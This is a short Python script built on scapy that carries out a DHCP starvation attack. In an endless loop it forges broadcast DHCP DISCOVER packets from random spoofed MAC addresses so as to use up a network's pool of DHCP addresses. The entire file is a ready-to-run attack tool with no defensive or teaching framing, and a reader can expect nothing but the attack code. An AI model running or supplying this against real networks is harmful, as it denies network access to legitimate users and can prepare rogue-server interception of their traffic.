from scapy.all import *
import random

def f_macgenerator():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255) )

print("Starting DHCP exhaustion...\nCTRL+C to stop.")

try:
    while 42:
        mac             = f_macgenerator()
        dhcpdiscover    = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255")  / UDP(sport=68, dport=67) / BOOTP(chaddr=RandMAC()) / DHCP(options=[("message-type", "discover"), "end"])
        sendp(dhcpdiscover, verbose=False)
        print(f"MAC: {mac}")
        time.sleep(0.2) 
except KeyboardInterrupt:
    print("\nStopped.")
    
